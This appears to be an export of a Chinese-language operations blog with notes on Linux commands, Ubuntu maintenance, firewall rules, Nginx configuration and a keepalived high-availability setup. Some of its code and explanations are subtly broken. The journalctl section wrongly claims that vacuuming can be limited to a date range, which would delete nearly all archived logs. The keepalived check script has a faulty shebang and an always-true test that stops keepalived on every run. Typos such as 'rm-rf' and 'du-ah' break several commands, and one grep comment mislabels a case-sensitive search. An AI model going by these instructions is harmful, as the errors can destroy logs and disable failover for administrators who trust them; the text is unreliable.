    <url>/cnblogs.github.io/2025/01/25/operations/linux/Linux%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><h5 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送邮件</span></span><br><span class="line">curl --url &#x27;smtp://smtp.example.com:587&#x27; --ssl-reqd --mail-from &#x27;sender@example.com&#x27; --mail-rcpt &#x27;recipient@example.com&#x27; --upload-file mail.txt --user &#x27;username:password&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="journalctl"><a href="#journalctl" class="headerlink" title="journalctl"></a>journalctl</h4><h5 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理指定日期之前的日志</span></span><br><span class="line">journalctl --vacuum-time=2024-01-01</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取 2024-01-01 的时间戳（示例时间戳为 1704076800，实际需根据系统获取）</span></span><br><span class="line">start_timestamp=1704076800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取 2024-01-10 的时间戳（示例时间戳为 1704940800，实际需根据系统获取）</span></span><br><span class="line">end_timestamp=1704940800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理指定时间段的日志 --vacuum-size=1 表示将删除符合时间范围的日志，最后的 1 是一个占位符，因为 --vacuum-size 需要一个参数来指定清理后的日志大小限制，但这里我们主要关注时间范围清理，所以设置为 1 表示不考虑大小限制进行清理</span></span><br><span class="line">journalctl --since=&quot;@$start_timestamp&quot; --until=&quot;@$end_timestamp&quot; --vacuum-size=1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按日志大小清理日志</span></span><br><span class="line">journalctl --vacuum-size=1G</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理 httpd 服务的日志</span></span><br><span class="line">journalctl --unit=httpd --vacuum-size=1G</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行的清理操作的详细信息，但不会真正删除任何日志</span></span><br><span class="line">journalctl --vacuum-size=1G --dry-run</span><br></pre></td></tr></table></figure>
<h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><h5 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将文件中的某个字符串替换为另一个字符串。</span></span><br><span class="line">sed &#x27;s/old_text/new_text/&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认情况下，sed 只替换每行中第一个匹配的字符串。如果要替换所有匹配的字符串，可以使用 g 选项</span></span><br><span class="line">sed &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除文件中包含特定字符串的行。</span></span><br><span class="line">sed &#x27;/pattern/d&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除文件中的所有空白行。</span></span><br><span class="line">sed &#x27;/^$/d&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在第2行前插入 new_line_text。</span></span><br><span class="line">sed &#x27;2i\new_line_text&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在第2行后插入 new_line_text。</span></span><br><span class="line">sed &#x27;2a\new_line_text&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将第2行替换为 new_line_text。</span></span><br><span class="line">sed &#x27;2c\new_line_text&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印第2行。</span></span><br><span class="line">sed -n &#x27;2p&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除 file.txt 中的所有数字.</span></span><br><span class="line">sed &#x27;s/[0-9]*//g&#x27; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认情况下，sed 不会修改原文件，而是将结果输出到标准输出。如果要直接修改原文件，可以使用 -i 选项</span></span><br><span class="line">sed -i &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 -i 选项时，可以指定备份文件的扩展名，以便在修改前备份原文件。</span></span><br><span class="line">sed -i.bak &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以一次性处理多个文件。</span></span><br><span class="line">sed &#x27;s/old_text/new_text/g&#x27; file1.txt file2.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以将 sed 命令写入脚本文件，然后通过 -f 选项执行。</span></span><br><span class="line">sed -f script.sed filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">替换第2行到第5行中的 old_text 为 new_text。</span></span><br><span class="line">sed &#x27;2,5s/old_text/new_text/g&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在匹配 pattern 的行的下一行中，将 old_text 替换为 new_text。</span></span><br><span class="line">sed &#x27;/pattern/&#123;n;s/old_text/new_text/&#125;&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在脚本中使用变量时，可以使用双引号而不是单引号。</span></span><br><span class="line">var=&quot;new_text&quot;</span><br><span class="line">sed &quot;s/old_text/$var/g&quot; filename</span><br></pre></td></tr></table></figure>
<h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><h5 id="基本用法-3"><a href="#基本用法-3" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;hello&quot;</span>，忽略大小写</span></span><br><span class="line">grep &quot;hello&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;hello&quot;</span>，忽略大小写</span></span><br><span class="line">grep -i &quot;hello&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出不包含 <span class="string">&quot;error&quot;</span> 的行</span></span><br><span class="line">grep -v &quot;error&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;error&quot;</span> 并显示行号</span></span><br><span class="line">grep -n &quot;error&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计包含 <span class="string">&quot;warning&quot;</span> 的行数</span></span><br><span class="line">grep -c &quot;warning&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归搜索目录中所有文件，查找 <span class="string">&quot;main&quot;</span></span></span><br><span class="line">grep -r &quot;main&quot; /path/to/directory</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索单词 <span class="string">&quot;test&quot;</span>（不会匹配 <span class="string">&quot;testing&quot;</span> 或 <span class="string">&quot;mytest&quot;</span>）</span></span><br><span class="line">grep -w &quot;test&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;error&quot;</span> 或 <span class="string">&quot;warning&quot;</span></span></span><br><span class="line">grep -E &quot;error|warning&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">高亮显示匹配的 <span class="string">&quot;error&quot;</span></span></span><br><span class="line">grep --color &quot;error&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示匹配行及其前后 2 行</span></span><br><span class="line">grep -C 2 &quot;error&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只显示包含 <span class="string">&quot;error&quot;</span> 的文件名</span></span><br><span class="line">grep -l &quot;error&quot; *.log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从管道中读取数据并搜索</span></span><br><span class="line">cat file.txt | grep &quot;hello&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索以 <span class="string">&quot;start&quot;</span> 开头的行</span></span><br><span class="line">grep &quot;^start&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索以 <span class="string">&quot;end&quot;</span> 结尾的行</span></span><br><span class="line">grep &quot;end$&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索包含 <span class="string">&quot;error&quot;</span> 或 <span class="string">&quot;warning&quot;</span> 的行</span></span><br><span class="line">grep -E &quot;error|warning&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索包含数字的行</span></span><br><span class="line">grep &quot;[0-9]&quot; file.txt</span><br></pre></td></tr></table></figure>
<h5 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找所有 .<span class="built_in">log</span> 文件并搜索 <span class="string">&quot;error&quot;</span></span></span><br><span class="line">find /path/to/directory -name &quot;*.log&quot; -exec grep &quot;error&quot; &#123;&#125; \;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找所有 .txt 文件并搜索 <span class="string">&quot;hello&quot;</span></span></span><br><span class="line">find /path/to/directory -name &quot;*.txt&quot; | xargs grep &quot;hello&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;error&quot;</span>，但排除 .bak 文件</span></span><br><span class="line">grep -r &quot;error&quot; --exclude=&quot;*.bak&quot; /path/to/directory</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在二进制文件中搜索字符串</span></span><br><span class="line">grep -a &quot;string&quot; binaryfile</span><br></pre></td></tr></table></figure>
<h4 id="通道符（-）"><a href="#通道符（-）" class="headerlink" title="通道符（|）"></a>通道符（|）</h4><h5 id="基本用法-4"><a href="#基本用法-4" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计文件行数</span></span><br><span class="line">cat file.txt | wc -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找特定进程</span></span><br><span class="line">ps aux | grep nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">排序并去重</span></span><br><span class="line">sort file.txt | uniq</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分页查看长输出</span></span><br><span class="line">ls -l /usr/bin | less</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计单词频率</span></span><br><span class="line">cat file.txt | tr &#x27; &#x27; &#x27;\n&#x27; | sort | uniq -c | sort -nr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找大文件</span></span><br><span class="line">find /var/log -type f -size +100M | xargs ls -lh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩日志文件</span></span><br><span class="line">cat access.log | gzip &gt; access.log.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实时监控日志</span></span><br><span class="line">tail -f /var/log/syslog | grep error</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">计算目录大小</span></span><br><span class="line">du -sh /home | cut -f1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">批量重命名文件</span></span><br><span class="line">ls *.txt | sed &#x27;s/\(.*\)\.txt/mv &amp; \1.doc/&#x27; | sh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu笔记</title>
    <url>/cnblogs.github.io/2025/01/11/operations/linux/Ubuntu%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><h5 id="常规命令"><a href="#常规命令" class="headerlink" title="常规命令"></a>常规命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 列出已安装的内核</span><br><span class="line">dpkg --list | grep linux-image</span><br><span class="line">## 删除一个特定的内核版本</span><br><span class="line">sudo apt-get remove --purge linux-image-&lt;version&gt;</span><br><span class="line"></span><br><span class="line">## 清理其他缓存文件</span><br><span class="line">rm-rf ~/.cache/*</span><br><span class="line"></span><br><span class="line">## 清理未使用的包文件</span><br><span class="line">sudo apt-get clean</span><br><span class="line">## 清理已安装包的无用依赖项</span><br><span class="line">sudo apt-get autoremove</span><br><span class="line">## 删除过期的包</span><br><span class="line">sudo apt-get autoclean</span><br><span class="line">## 清理日志文件 （删除超过 7 天的日志文件）</span><br><span class="line">sudo journalctl --vacuum-time=7d</span><br></pre></td></tr></table></figure>

<h5 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 编辑工具</span><br><span class="line">sudo apt install vim</span><br><span class="line">## 网络工具</span><br><span class="line">sudo apt install iputils-ping</span><br><span class="line">sudo apt install telnet telnetd openbsd-inetd</span><br><span class="line">sudo apt-get install dnsutils</span><br><span class="line">sudo apt-get install net-tools</span><br><span class="line">sudo apt-get install lrzsz</span><br><span class="line">## 常用工具</span><br><span class="line">sudo apt-get install zip</span><br></pre></td></tr></table></figure>

<h5 id="排查问题命令"><a href="#排查问题命令" class="headerlink" title="排查问题命令"></a>排查问题命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 排查端口占用情况</span><br><span class="line">sudo netstat -tlnp | grep 30001</span><br><span class="line">## du查找大文件</span><br><span class="line">du-ah / |sort-rh |head-n 10</span><br></pre></td></tr></table></figure>

<h5 id="防火墙命令"><a href="#防火墙命令" class="headerlink" title="防火墙命令"></a>防火墙命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装ufw</span><br><span class="line">sudo apt install ufw -y</span><br><span class="line">## 开启防火墙</span><br><span class="line">sudo ufw enable</span><br><span class="line">## 关闭防火墙</span><br><span class="line">sudo ufw disable </span><br><span class="line">## 开启设置的默认策略</span><br><span class="line">sudo ufw default allow</span><br><span class="line">## 查看防火墙状态</span><br><span class="line">sudo ufw status</span><br><span class="line">## 开启端口</span><br><span class="line">sudo ufw allow 22</span><br><span class="line">## 删除规则</span><br><span class="line">sudo ufw delete allow 22</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx笔记</title>
    <url>/cnblogs.github.io/2025/01/10/operations/nginx/nginx%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="常规配置"><a href="#常规配置" class="headerlink" title="常规配置"></a>常规配置</h3><h4 id="基础-HTTP-服务配置"><a href="#基础-HTTP-服务配置" class="headerlink" title="基础 HTTP 服务配置"></a>基础 HTTP 服务配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;                  # 监听 80 端口（HTTP）</span><br><span class="line">    server_name example.com;    # 域名或 IP</span><br><span class="line">    root /var/www/html;         # 静态文件根目录</span><br><span class="line">    index index.html index.htm; # 默认索引文件</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ =404; # 优先匹配文件，再匹配目录，否则返回 404</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="反向代理配置"><a href="#反向代理配置" class="headerlink" title="反向代理配置"></a>反向代理配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name example.com;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://localhost:3000;  # 将请求转发到本地的 3000 端口（如 Node.js 应用）</span><br><span class="line">        proxy_set_header Host $host;       # 传递原始请求头</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    upstream backend &#123;          # 定义后端服务器组</span><br><span class="line">        server 10.0.0.1:80 weight=3;  # 权重 3（更高优先级）</span><br><span class="line">        server 10.0.0.2:80;</span><br><span class="line">        server 10.0.0.3:80 backup;    # 备用服务器（当其他服务器宕机时启用）</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name example.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://backend;  # 请求转发到后端组</span><br><span class="line">            # 可选负载均衡算法：轮询（默认）、weight、ip_hash（会话保持）、least_conn（最少连接）等</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="SSL-配置（HTTPS）"><a href="#SSL-配置（HTTPS）" class="headerlink" title="SSL 配置（HTTPS）"></a>SSL 配置（HTTPS）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name example.com;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /etc/nginx/ssl/example.com.crt;    # SSL 证书路径</span><br><span class="line">    ssl_certificate_key /etc/nginx/ssl/example.com.key; # 私钥路径</span><br><span class="line"></span><br><span class="line">    # 推荐 SSL 协议和加密套件</span><br><span class="line">    ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /var/www/html;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 强制 HTTP 跳转到 HTTPS</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name example.com;</span><br><span class="line">    return 301 https://$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="静态文件缓存优化"><a href="#静态文件缓存优化" class="headerlink" title="静态文件缓存优化"></a>静态文件缓存优化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ &#123;</span><br><span class="line">        expires 7d;          # 客户端缓存 7 天</span><br><span class="line">        add_header Cache-Control &quot;public&quot;;</span><br><span class="line">        access_log off;      # 可选：关闭此类请求的日志</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="重定向与重写规则"><a href="#重定向与重写规则" class="headerlink" title="重定向与重写规则"></a>重定向与重写规则</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 301 永久重定向</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name old-domain.com;</span><br><span class="line">    return 301 https://new-domain.com$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># URL 重写（如隐藏 .php 扩展）</span><br><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">        rewrite ^/user/(\d+) /user.php?id=$1 last; # 将 /user/123 重写为 /user.php?id=123</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 限制 IP 访问</span><br><span class="line">location /admin &#123;</span><br><span class="line">    allow 192.168.1.0/24;  # 允许特定 IP 段</span><br><span class="line">    deny all;               # 拒绝其他所有 IP</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 基础认证（用户名/密码）</span><br><span class="line">location /private &#123;</span><br><span class="line">    auth_basic &quot;Restricted Area&quot;;</span><br><span class="line">    auth_basic_user_file /etc/nginx/.htpasswd;  # 使用 htpasswd 生成的文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    log_format main &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                    &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                    &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log /var/log/nginx/access.log main;  # 访问日志路径及格式</span><br><span class="line">    error_log /var/log/nginx/error.log warn;    # 错误日志级别（warn、error、crit 等）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Gzip-压缩"><a href="#Gzip-压缩" class="headerlink" title="Gzip 压缩"></a>Gzip 压缩</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    gzip on;                 # 开启 Gzip</span><br><span class="line">    gzip_types text/plain text/css application/json application/javascript text/xml application/xml image/svg+xml;</span><br><span class="line">    gzip_min_length 1024;    # 最小压缩文件大小</span><br><span class="line">    gzip_comp_level 6;       # 压缩级别（1-9）</span><br><span class="line">    gzip_vary on;            # 根据请求头 Vary: Accept-Encoding 启用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="跨域配置（CORS）"><a href="#跨域配置（CORS）" class="headerlink" title="跨域配置（CORS）"></a>跨域配置（CORS）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /api &#123;</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Origin&#x27; &#x27;*&#x27;;              # 允许所有域名（生产环境建议指定域名）</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Methods&#x27; &#x27;GET, POST, OPTIONS&#x27;;</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Headers&#x27; &#x27;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="高可用（Keepalived）配置"><a href="#高可用（Keepalived）配置" class="headerlink" title="高可用（Keepalived）配置"></a>高可用（Keepalived）配置</h3><table>
<thead>
<tr>
<th>操作系统</th>
<th>IP</th>
<th>角色</th>
</tr>
</thead>
<tbody><tr>
<td>centos7</td>
<td>192.168.133.130</td>
<td>vip（虚拟ip）</td>
</tr>
<tr>
<td></td>
<td>192.168.133.131</td>
<td>keepalived+nginx1</td>
</tr>
<tr>
<td></td>
<td>192.168.133.132</td>
<td>keepalived+nginx2）</td>
</tr>
</tbody></table>
<h4 id="安装nginx-略"><a href="#安装nginx-略" class="headerlink" title="安装nginx (略)"></a>安装nginx (略)</h4><h4 id="安装keepalived"><a href="#安装keepalived" class="headerlink" title="安装keepalived"></a>安装keepalived</h4><p>yum方式直接安装即可，该方式会自动安装依赖</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install keepalived</span><br></pre></td></tr></table></figure>
<p>yum方式安装的会生产配置文件在&#x2F;etc&#x2F;keepalived下：keepalived.conf<br>两台服务器均需要安装keepalived</p>
<h4 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h4><p>1、先准备nginx的检测脚本 cat &#x2F;etc&#x2F;keepalived&#x2F;check_nginx.sh 内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">bin/bash</span></span><br><span class="line">counter=$(ps -C nginx |grep -v PID |wc -l) #取命令结果赋值给变量</span><br><span class="line">if [ $counter==0 ];then   #判断变量里的值如果等于0</span><br><span class="line">    systemctl start nginx   #尝试启动nginx  </span><br><span class="line">    sleep 5</span><br><span class="line">    counter=$(ps -C nginx |grep -v PID |wc -l)</span><br><span class="line">    if [ $counter==0 ];then #在判断变量里的值如果还等于0</span><br><span class="line">        systemctl stop keepalived  </span><br><span class="line">    fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>脚本授权 chmod +x &#x2F;etc&#x2F;keepalived&#x2F;check_nginx.sh</p>
<p>2、准备keepalived的配置 192.168.133.131配置如下：配置前先备份原有配置，原有配置项较多，有些不需要。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /etc/keepalived/keepalived.conf   /etc/keepalived/keepalived.conf.bak</span><br></pre></td></tr></table></figure>
<p>vim &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf 输入如下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">#检测脚本定义</span><br><span class="line">vrrp_script check_nginx &#123;     #脚本模块</span><br><span class="line">    script  &quot;/etc/keepalived/check_nginx.sh&quot;    #脚本路径</span><br><span class="line">interval 2    #检测脚本时间2秒</span><br><span class="line">weight 10     #优先级</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line">   router_id master-ip   </span><br><span class="line">   vrrp_skip_check_adv_addr</span><br><span class="line">   script_user root</span><br><span class="line">   enable_script_security</span><br><span class="line"></span><br><span class="line">   vrrp_strict</span><br><span class="line">   vrrp_garp_interval 0</span><br><span class="line">   vrrp_gna_interval 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state MASTER         # 指定keepalived的角色，MASTER为主，BACKUP为备</span><br><span class="line">    interface ens33      # 当前进行vrrp通讯的网络接口卡(当前centos的网卡) 用ifconfig查看你具体的网卡</span><br><span class="line">    virtual_router_id 51 # 虚拟路由编号，主从要一致</span><br><span class="line">    priority 100         # 优先级，数值越大，获取处理请求的优先级越高</span><br><span class="line">    advert_int 1         # 检查间隔，默认为1s(vrrp组播周期秒数)</span><br><span class="line">    authentication &#123;     #设置验证类型和密码，MASTER和BACKUP必须使用相同的密码才能正常通信</span><br><span class="line">        auth_type PASS  </span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    track_script &#123; </span><br><span class="line">        check_nginx      #（调用检测脚本）</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.133.130  # 定义虚拟ip(VIP)，可多设，每行一个</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>192.168.133.132 配置如下：</p>
